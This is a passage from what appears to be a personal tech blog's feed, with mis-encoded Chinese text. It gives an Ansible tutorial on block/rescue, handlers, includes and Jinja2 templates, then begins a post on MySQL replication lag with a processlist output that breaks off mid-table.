executes&quot;</span><br></pre></td></tr></table></figure><p>rescueè¡¨ç¤ºä¸Šä¸€ä¸ªtask(command:/bin/false)è¯­å¥æ‰§è¡Œå¼‚å¸¸æ—¶å°±ä¼šæ‰§è¡Œrescueçš„task.</p><p>è€Œalwaysè¡¨ç¤ºæ— è®ºcommand:/bin/falseæ˜¯å¦æ‰§è¡Œå¼‚å¸¸éƒ½ä¼šæ‰§è¡Œ.</p><hr><h3 id="blockå—æˆ–è€…l-æ–¹å¼åŠŸèƒ½â€“ä½¿notifyå¯¹åº”å¤šä¸ªhandlers"><a href="#blockå—æˆ–è€…l-æ–¹å¼åŠŸèƒ½â€“ä½¿notifyå¯¹åº”å¤šä¸ªhandlers" class="headerlink" title="blockå—æˆ–è€…l-æ–¹å¼åŠŸèƒ½â€“ä½¿notifyå¯¹åº”å¤šä¸ªhandlers"></a>blockå—æˆ–è€…l-æ–¹å¼åŠŸèƒ½â€“ä½¿notifyå¯¹åº”å¤šä¸ªhandlers</h3><p>åˆ©ç”¨blockå—åŠŸèƒ½,å¯ä»¥å°†ä¸€ä¸ªnotifyè¯­å¥,å¯¹åº”å¤šä¸ªhandlersè¯­å¥.ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  notify:</span><br><span class="line">      - restart nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">handlers:</span><br><span class="line"></span><br><span class="line">   - name: restart nginx</span><br><span class="line">     block:</span><br><span class="line">       - command: docker restart web</span><br><span class="line">         when: inventory_hostname == &apos;docker&apos;</span><br><span class="line"></span><br><span class="line">       - shell: nginx -s reload</span><br><span class="line">         when: inventory_hostname != &apos;docker&apos;</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤ä¸€æ¥,å¯ä»¥åˆ†åˆ«é’ˆå¯¹ä¸åŒæœåŠ¡å™¨çš„é‡å¯æ–¹æ³•æ¥é‡å¯nginx.è¿˜å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„æ–¹å¼:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    notify:</span><br><span class="line">            - restart nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">handlers:</span><br><span class="line">   - name: restart nginx     shell: |-       &#123;%- if inventoey == &apos;docker&apos; -%&#125;         docker restart web       &#123;%- else -%&#125;         nginx -s reload       [%- endif -%&#125;</span><br></pre></td></tr></table></figure><p>|- è¡¨ç¤ºä¸æ¢è¡Œ,ä¸‹åˆ—çš„ifæ§åˆ¶è¯­å¥å†…çš„çœŸå®commandè¯­å¥éƒ½åœ¨shellæ¨¡å—çš„æœ¬è¡Œæ‰§è¡Œ.</p><hr><h3 id="includes"><a href="#includes" class="headerlink" title="includes"></a>includes</h3><p>includesåœ¨Ansibleä¸­èµ·å¼•ç”¨åŠŸèƒ½,.å…¶åŠŸèƒ½éå¸¸å¼ºå¤§,å¯ä»¥å¼•å…¥ä¸€ä¸ªPlaybookæ–‡ä»¶,å˜é‡varæ–‡ä»¶ç­‰ç­‰.æœ‰æ—¶å€™å¤šä¸ªtaskæˆ–è€…playbookéœ€è¦è¿›è¡Œä¸€é¡¹é‡å¤çš„å·¥ä½œ,åˆ™å¯ä»¥å°†è¿™éƒ¨åˆ†åŠŸèƒ½å•ç‹¬å†™å…¥ä¸€ä¸ªplaybookæ–‡ä»¶,ç„¶åå†é€šè¿‡includesè°ƒç”¨.è€Œä¸å¿…æ¯ä¸ªplaybookéƒ½å»å†™åŒæ ·ä¸€ä¸ªåŠŸèƒ½çš„task.è¿™æœ‰ç‚¹ç±»ä¼¼äºshellè„šæœ¬çš„å‡½æ•°</p><p>ç”¨æ³•:</p><p>æ¯”å¦‚ä¸‹é¢å®šä¹‰äº†ä¸€ä¸ªphpçš„playbook:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- hosts: all</span><br><span class="line">  remote_user: root</span><br><span class="line">  tasks:</span><br><span class="line">    - name:PHP a project</span><br><span class="line">      command: A project</span><br><span class="line">- name: restart php</span><br><span class="line">  hosts: all</span><br><span class="line">  remote_user: root</span><br><span class="line">  tasks:</span><br><span class="line">    - include: restartphp.yml</span><br></pre></td></tr></table></figure><p>ç„¶åå®šä¹‰restartphp.ymlæ–‡ä»¶:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- name: restart php</span><br><span class="line">  server: name=php-fpm state=restarted</span><br></pre></td></tr></table></figure><p>åŒæ ·å…¶ä»–çš„playbookæƒ³è¦é‡å¯PhpæœåŠ¡ä¸å¿…å†å†™é‡å¤çš„playbook task.åªéœ€è¦include retartphp.ymlæ–‡ä»¶å³å¯.</p><h4 id="åŠ¨æ€includes"><a href="#åŠ¨æ€includes" class="headerlink" title="åŠ¨æ€includes"></a>åŠ¨æ€includes</h4><p>includesè¿˜å¯ä»¥ç»“åˆwhenè¯­å¥.å³åªæœ‰å½“æ»¡è¶³whenæ¡ä»¶æ—¶,æ‰includeæ–‡ä»¶æ‰§è¡Œ.ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-name: check if file exist</span><br><span class="line"> stat: path=test.txt</span><br><span class="line"> register: check_file</span><br><span class="line"></span><br><span class="line">-include: task.yml</span><br><span class="line"> when: check_file.stat.exists</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¼”ç¤ºäº†includeçš„ç”¨æ³•:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim include.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">  - hosts: all</span><br><span class="line">    remote_user: root</span><br><span class="line">    tasks:</span><br><span class="line">       - include: task.yml</span><br><span class="line">         when: ansible_default_ipv4.address == &quot;10.0.4.230&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@localhost playbook]$vim task.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">    #è¿™æ˜¯include.ymlæ–‡ä»¶å¯¼å…¥çš„playbook</span><br><span class="line">  - name: create a file</span><br><span class="line">    file: path=/tmp/include.txt state=touch</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœå¯ä»¥æ˜¾ç¤ºè¿™ä¸ªincludeçš„task.ymlæ–‡ä»¶åªåœ¨10.0.4.230è¿™å°æœåŠ¡å™¨ä¸Šæ‰§è¡Œäº†:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook include.yml</span><br><span class="line"></span><br><span class="line">TASK [create a file] *********************************************************************************************************************************************************************************************</span><br><span class="line">skipping: [10.0.4.231]</span><br><span class="line">changed: [10.0.4.230]</span><br><span class="line"></span><br><span class="line">PLAY RECAP *******************************************************************************************************************************************************************************************************</span><br><span class="line">10.0.4.230                 : ok=2    changed=1    unreachable=0    failed=0</span><br><span class="line">10.0.4.231                 : ok=1    changed=0    unreachable=0    failed=0</span><br></pre></td></tr></table></figure><hr><h3 id="template-æ¨¡æ¿"><a href="#template-æ¨¡æ¿" class="headerlink" title="template æ¨¡æ¿"></a>template æ¨¡æ¿</h3><p>templateå¸¸è¢«ç”¨æ¥ä¼ è¾“æ–‡ä»¶,ä½†æ˜¯templateæ¨¡æ¿çš„å¼ºå¤§ä¹‹å¤„å°±åœ¨äºæ”¯æŒå˜é‡æ›¿æ¢.templateæ”¯æŒjinja2çš„æ¸²æŸ“æ ¼å¼,.å¦å¤–è¿˜æ”¯æŒforå¾ªç¯ä»¥åŠifåˆ¤æ–­è¯­å¥.ä¸‹é¢æ¥ä¸€ä¸ªç®€å•çš„ä¾‹å­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#ç¼–å†™ä¸€ä¸ªç®€å•çš„playbook</span><br><span class="line">[root@localhost playbook]$vim template.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"> - hosts: all</span><br><span class="line">   vars:</span><br><span class="line">      - version: 1.3.5</span><br><span class="line">      - env_name: beta</span><br><span class="line">      - author: jesse</span><br><span class="line"></span><br><span class="line">   tasks:</span><br><span class="line">      - name: practise tempalte function</span><br><span class="line">        template: src=template/test_template.j2 dest=/tmp/test_template.txt</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">#ç¼–å†™test_template.j2æ¨¡æ¿æ–‡ä»¶:</span><br><span class="line">[root@localhost playbook]$vim template/test_template.j2</span><br><span class="line"></span><br><span class="line">project_env: &#123;&#123; env_name &#125;&#125;</span><br><span class="line">project_version: &#123;&#123; version &#125;&#125;</span><br><span class="line">project_author: &#123;&#123; author &#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œtemplate.ymlè¿™ä¸ªplaybook:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook template.yml</span><br><span class="line"></span><br><span class="line">TASK [practise tempalte function] ********************************************************************************************************************************************************************************</span><br><span class="line">changed: [10.0.4.230]</span><br><span class="line">changed: [10.0.4.231]</span><br><span class="line"></span><br><span class="line">PLAY RECAP *******************************************************************************************************************************************************************************************************</span><br><span class="line">10.0.4.230                 : ok=2    changed=1    unreachable=0    failed=0</span><br><span class="line">10.0.4.231                 : ok=2    changed=1    unreachable=0    failed=0</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è¿œç¨‹ä¸»æœºä¸Šçš„test_template.txtæ–‡ä»¶:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$cat /tmp/test_template.txt</span><br><span class="line">project_env: beta</span><br><span class="line">project_version: 1.3.5</span><br><span class="line">project_author: jesse</span><br></pre></td></tr></table></figure><hr><h4 id="templateçš„jinja2-æ¨¡æ¿forå¾ªç¯"><a href="#templateçš„jinja2-æ¨¡æ¿forå¾ªç¯" class="headerlink" title="templateçš„jinja2 æ¨¡æ¿forå¾ªç¯"></a>templateçš„jinja2 æ¨¡æ¿forå¾ªç¯</h4><p>æ¨¡æ¿forå¾ªç¯çš„æ ¼å¼å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for item in item_list %&#125;</span><br><span class="line">  ......</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>æ¸²æŸ“é£æ ¼å’Œpythonçš„djangoçš„æ¨¡æ¿æ¸²æŸ“é£æ ¼ä¸€æ¨¡ä¸€æ ·,. å¤§æ‹¬å·ä¸¤è¾¹ä¹Ÿè¦é¢„ç•™ä¸€ä¸ªç©ºæ ¼..</p><p>ä¾‹å¦‚ç¨å¾®æ”¹ä¸€ä¸‹ä¸Šé¢ä¾‹å­ä¸­çš„test_template.j2æ¨¡æ¿æ–‡ä»¶:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim template/test_template.j2</span><br><span class="line"></span><br><span class="line">&#123;% for item in range(1,10) %&#125;</span><br><span class="line">   line &#123;&#123; item &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>é‡æ–°æ‰§è¡Œplaybookå,åœ¨è¿œç¨‹æœåŠ¡å™¨èŠ‚ç‚¹ä¸ŠæŸ¥çœ‹/tmp/test_template.txtæ–‡ä»¶å†…å®¹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$cat /tmp/test_template.txt</span><br><span class="line">   line 1</span><br><span class="line">   line 2</span><br><span class="line">   line 3</span><br><span class="line">   line 4</span><br><span class="line">   line 5</span><br><span class="line">   line 6</span><br><span class="line">   line 7</span><br><span class="line">   line 8</span><br><span class="line">   line 9</span><br><span class="line">[root@localhost ~]$</span><br></pre></td></tr></table></figure><hr><h4 id="templateæ¨¡æ¿çš„-jinja2-Ifè¯­å¥"><a href="#templateæ¨¡æ¿çš„-jinja2-Ifè¯­å¥" class="headerlink" title="templateæ¨¡æ¿çš„ jinja2 Ifè¯­å¥"></a>templateæ¨¡æ¿çš„ jinja2 Ifè¯­å¥</h4><ul><li>ifæ¡ä»¶åˆ¤æ–­è¯­å¥æ ¼å¼å¦‚ä¸‹:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if condition %&#125;</span><br><span class="line">......</span><br><span class="line">&#123;% else%&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­ç¨å¾®æ”¹ä¸€ä¸‹ä¸Šé¢ä¾‹å­çš„test_template.j2æ¨¡æ¿æ–‡ä»¶:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#ä¸‹é¢çš„ä¾‹å­ä¸­å…ˆåˆ¤æ–­authorå€¼,ä»¥åŠmynameå˜é‡æ˜¯å¦å®šä¹‰.(æˆ‘ä»¬çš„template.ymlçš„playbookæ–‡ä»¶ä¸­å®šä¹‰äº†authorå˜é‡,ä½†æ˜¯æ²¡æœ‰å®šä¹‰mynameå˜é‡)</span><br><span class="line">[root@localhost playbook]$vim template/test_template.j2</span><br><span class="line"></span><br><span class="line">&#123;% if author == &quot;jesse&quot; %&#125;</span><br><span class="line">HI,my name is jesse</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% if  myname  is defined %&#125;</span><br><span class="line">hi.myname is &#123;&#123; myname &#125;&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">sorry,myname is not defined.</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæ¯•å,è¿œç¨‹æœåŠ¡å™¨èŠ‚ç‚¹æ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$cat /tmp/test_template.txt</span><br><span class="line">HI,my name is jesse</span><br><span class="line"></span><br><span class="line">sorry,myname is not defined.</span><br></pre></td></tr></table></figure><ul><li>ifå¤šé‡åˆ¤æ–­</li></ul><p>ifè¯­å¥æ‰§è¡Œé€»è¾‘ä¸(and)å’Œé€»è¾‘æˆ–(or)çš„å¤šé‡åˆ¤æ–­.æ¯”å¦‚ä¸‹é¢çš„ä¾‹å­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if dwd_env is defined and https %&#125;</span><br><span class="line">    listen 443 ssl http2;</span><br><span class="line">    ssl_protocols TLSV1 TLSV1.1  TLSv1.2 ;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">    ssl_ciphers &quot;EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH&quot;;</span><br><span class="line">    ssl_ecdh_curve secp384r1;</span><br><span class="line">    ssl_session_cache shared:SSL:10m;</span><br><span class="line">    #ssl_session_tickets off;</span><br><span class="line">    ssl_session_timeout 60m;</span><br><span class="line">    ssl_stapling on;</span><br><span class="line">    ssl_stapling_verify on;</span><br><span class="line">    resolver 8.8.4.4 8.8.8.8 valid=300s;</span><br><span class="line">    resolver_timeout 5s;</span><br><span class="line">   #add_header Strict-Transport-Security &quot;max-age=63072000; includeSubDomains; preload&quot;;</span><br><span class="line">    add_header X-Frame-Options DENY;</span><br><span class="line">    add_header X-Content-Type-Options nosniff;</span><br><span class="line">    ssl_certificate /etc/letsencrypt/live/&#123;&#123; dwd_env &#125;&#125;.&#123;&#123; servername &#125;&#125;/fullchain.pem;</span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/&#123;&#123; dwd_env &#125;&#125;.&#123;&#123; servername &#125;&#125;/privkey.pem;</span><br><span class="line">    ssl_trusted_certificate  /etc/letsencrypt/live/&#123;&#123; dwd_env &#125;&#125;.&#123;&#123; servername &#125;&#125;/chain.pem;</span><br><span class="line"></span><br><span class="line">   &#123;% else %&#125;</span><br><span class="line"></span><br><span class="line">    listen &#123;&#123; listen | default(80) &#125;&#125;;</span><br><span class="line"></span><br><span class="line">  &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¾‹å­ä¸­å˜é‡dwd_envæ˜¯å­—ç¬¦ä¸²ç±»å‹.å€¼ä¸ºbeta,è€Œhttpsçš„å˜é‡ç±»å‹æ˜¯å¸ƒå°”å‹,å€¼ä¸ºTrue.</p><hr><h4 id="template-jinja2-default-è¯­å¥"><a href="#template-jinja2-default-è¯­å¥" class="headerlink" title="template jinja2 default()è¯­å¥"></a>template jinja2 default()è¯­å¥</h4><p>é™¤äº†ifæ¡ä»¶åˆ¤æ–­å¤–,è¿˜å¯ä»¥ä½¿ç”¨default()è¯­å¥.é¡¾åæ€ä¹‰,è¿™æ˜¯è¡¨ç¤ºä¸€ä¸ªé»˜è®¤å€¼.</p><p>ç”¨æ³•æ ¼å¼:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; var | default(value) &#125;&#125; #å¦‚æœå˜é‡varæœ‰å®šä¹‰åˆ™å–ç”¨varçš„å€¼,å¦åˆ™å°±ä½¿ç”¨é»˜è®¤å€¼value</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸€ä¸‹ä¸Šè¿°çš„templateæ¨¡æ¿æ–‡ä»¶å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim template/test_template.j2</span><br><span class="line"></span><br><span class="line">my book is &#123;&#123; book | default(&apos;ansible&apos;) &#125;&#125;;</span><br><span class="line">my name is &#123;&#123; author | default(&apos;xiaoming&apos;) &#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå,è¿œç¨‹æœåŠ¡å™¨èŠ‚ç‚¹çš„æ–‡ä»¶å†…å®¹è¾“å‡ºå¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$cat /tmp/test_template.txt</span><br><span class="line">my book is ansible;</span><br><span class="line">my name is jesse</span><br></pre></td></tr></table></figure><h5 id="templateçš„Jinja2ç‰¹æ€§è¿˜å¯ä»¥ä½¿ç”¨pythonçš„å…¶ä»–è¯­æ³•-æ¯”å¦‚åˆå¹¶å˜é‡å€¼-è¿‡æ»¤ç­‰ç­‰-è¿™äº›é«˜çº§ç”¨æ³•ä»¥åé¢å¯¹å¤æ‚çš„å¤§é¡¹ç›®æ—¶å†å»ç ”ç©¶-ç›®å‰æŒæ¡è¿™äº›åŸºç¡€è¯­æ³•å·²ç»ç»„è¶³å¤Ÿæ»¡è¶³ç»å¤§å¤šæ•°çš„å·¥ä½œä»»åŠ¡"><a href="#templateçš„Jinja2ç‰¹æ€§è¿˜å¯ä»¥ä½¿ç”¨pythonçš„å…¶ä»–è¯­æ³•-æ¯”å¦‚åˆå¹¶å˜é‡å€¼-è¿‡æ»¤ç­‰ç­‰-è¿™äº›é«˜çº§ç”¨æ³•ä»¥åé¢å¯¹å¤æ‚çš„å¤§é¡¹ç›®æ—¶å†å»ç ”ç©¶-ç›®å‰æŒæ¡è¿™äº›åŸºç¡€è¯­æ³•å·²ç»ç»„è¶³å¤Ÿæ»¡è¶³ç»å¤§å¤šæ•°çš„å·¥ä½œä»»åŠ¡" class="headerlink" title="templateçš„Jinja2ç‰¹æ€§è¿˜å¯ä»¥ä½¿ç”¨pythonçš„å…¶ä»–è¯­æ³•,æ¯”å¦‚åˆå¹¶å˜é‡å€¼,è¿‡æ»¤ç­‰ç­‰.è¿™äº›é«˜çº§ç”¨æ³•ä»¥åé¢å¯¹å¤æ‚çš„å¤§é¡¹ç›®æ—¶å†å»ç ”ç©¶.ç›®å‰æŒæ¡è¿™äº›åŸºç¡€è¯­æ³•å·²ç»ç»„è¶³å¤Ÿæ»¡è¶³ç»å¤§å¤šæ•°çš„å·¥ä½œä»»åŠ¡"></a>templateçš„Jinja2ç‰¹æ€§è¿˜å¯ä»¥ä½¿ç”¨pythonçš„å…¶ä»–è¯­æ³•,æ¯”å¦‚åˆå¹¶å˜é‡å€¼,è¿‡æ»¤ç­‰ç­‰.è¿™äº›é«˜çº§ç”¨æ³•ä»¥åé¢å¯¹å¤æ‚çš„å¤§é¡¹ç›®æ—¶å†å»ç ”ç©¶.ç›®å‰æŒæ¡è¿™äº›åŸºç¡€è¯­æ³•å·²ç»ç»„è¶³å¤Ÿæ»¡è¶³ç»å¤§å¤šæ•°çš„å·¥ä½œä»»åŠ¡</h5>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;playbooké«˜çº§ç‰¹æ€§&quot;&gt;&lt;a href=&quot;#playbooké«˜çº§ç‰¹æ€§&quot; class=&quot;headerlink&quot; title=&quot;playbooké«˜çº§ç‰¹æ€§&quot;&gt;&lt;/a&gt;playbooké«˜çº§ç‰¹æ€§&lt;/h2&gt;&lt;h3 id=&quot;tags-æ ‡ç­¾&quot;&gt;&lt;a href=&quot;#tags-æ ‡ç­¾&quot; class=&quot;headerlink&quot; title=&quot;tags æ ‡ç­¾&quot;&gt;&lt;/a&gt;tags æ ‡ç­¾&lt;/h3&gt;&lt;p&gt;ç»™taskæ‰“ä¸Šæ ‡ç­¾å¯ä»¥å…è®¸playbookæ‰§è¡Œçš„æ—¶å€™ä½¿ç”¨â€“tagsé€‰é¡¹åªæ‰§è¡ŒæŸä¸ªtaskæˆ–è€…â€“skip-tagsé€‰é¡¹ä¸æ‰§è¡ŒæŸä¸ªtask.ä¾‹å¦‚:&lt;/p&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>mysql5.7ä¸»ä»åŒæ­¥å»¶æ—¶é—®é¢˜</title>
    <link href="https://jesse.top/2018/08/22/mysql/mysql%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E5%BB%B6%E6%97%B6%E9%97%AE%E9%A2%98/"/>
    <id>https://jesse.top/2018/08/22/mysql/mysqlä¸»ä»åŒæ­¥å»¶æ—¶é—®é¢˜/</id>
    <published>2018-08-22T03:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mysqlä¸»ä»åŒæ­¥å»¶æ—¶é—®é¢˜"><a href="#mysqlä¸»ä»åŒæ­¥å»¶æ—¶é—®é¢˜" class="headerlink" title="mysqlä¸»ä»åŒæ­¥å»¶æ—¶é—®é¢˜"></a>mysqlä¸»ä»åŒæ­¥å»¶æ—¶é—®é¢˜</h2><p>æœ€è¿‘é¢†å¯¼å°†MASTERçš„ä¸»åº“æ¸…ç©ºäº†æœ€è¿‘å‡ ä¸ªæœˆçš„æ•°æ®,è¿›è¡Œäº†å¤§å¹¶å‘çš„æ“ä½œ.è¿™å¯¼è‡´äº†mysqlçš„ä»åº“å»¶æ—¶éå¸¸é«˜çš„é—®é¢˜.zabbixæŠ¥è­¦å¦‚ä¸‹:</p><p><img src="http://pabkmteb4.bkt.clouddn.com/mysql-monitor.png" alt="mysql-zabbix"></p><p>å»¶æ—¶ä¸€ç›´é£™å‡åˆ°23ä¸ªå°æ—¶.</p><a id="more"></a> <h4 id="è§£å†³è¿‡ç¨‹"><a href="#è§£å†³è¿‡ç¨‹" class="headerlink" title="è§£å†³è¿‡ç¨‹"></a>è§£å†³è¿‡ç¨‹</h4><p>1.æŸ¥çœ‹masteråº“çš„æ…¢æŸ¥è¯¢æ¡æ•°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&quot;root@localhost:mysql.sock  [(none)]&gt;show processlist;</span><br><span class="line">+-----------+--------+----------------------+---------------+-------------+--------+---------------------------------------------------------------+------------------+</span><br><span class="line">| Id        | User   | Host                 | db            | Command     | Time   | State                                                         | Info             |</span><br><span class="line">+-----------+--------+----------------------+---------------+-------------+--------+---------------------------------------------------------------+------------------+</span><br><span class="line">                                                         | NULL             |</span><br><span class="line">| 285241295 | repl   | 10.8.0.6:60866       | NULL          | Binlog Dump | 319038 | Master has sent all binlog to slave; waiting for more updates | NULL             |</span><br><span class="line">| 285243495 | canal  | 10.25.2.85:42252     | NULL          | Binlog Dump | 319014 | Master has sent all binlog to slave; waiting for more updates | NULL             |</span><br><span class="line">| 290884712 | root   | 10.47.54.80:49170    | dwd_cron      | Sleep       |     68 |                                                               | NULL             |</span><br><span class="line">| 292617828 | tongji | 10.153.138.121:62821 | NULL          | Sleep       |      1 |                                                               | NULL             |</span><br><span class="line">| 292617838 | tongji | 10.153.138.121:62822 | NULL          | Sleep       |      2 |                                                               | NULL             |</span><br><span class="line">| 292617918 | tongji | 10.153.138.121:62872 | NULL          | Sleep       |      2 |                                                               | NULL             |</span><br><span class="line">| 300508313 | root   | 10.47.54.80:41858    | dwd_cron      | Sleep       |    194 |                                                               | NULL             |</span><br><span class="line">| 309403589 | root   | 10.47.54.80:42136    | dwd_cron      | Sleep       |    198 |                                                               | NULL             |</span><br><span class="line">| 309403590 | root   | 10.47.54.80:42138    | dwd_cron      | Sleep       |    198 |                                                               | NULL             |</span><br><span class="line">| 313939869 | root   | 10.25.2.85:40936     | 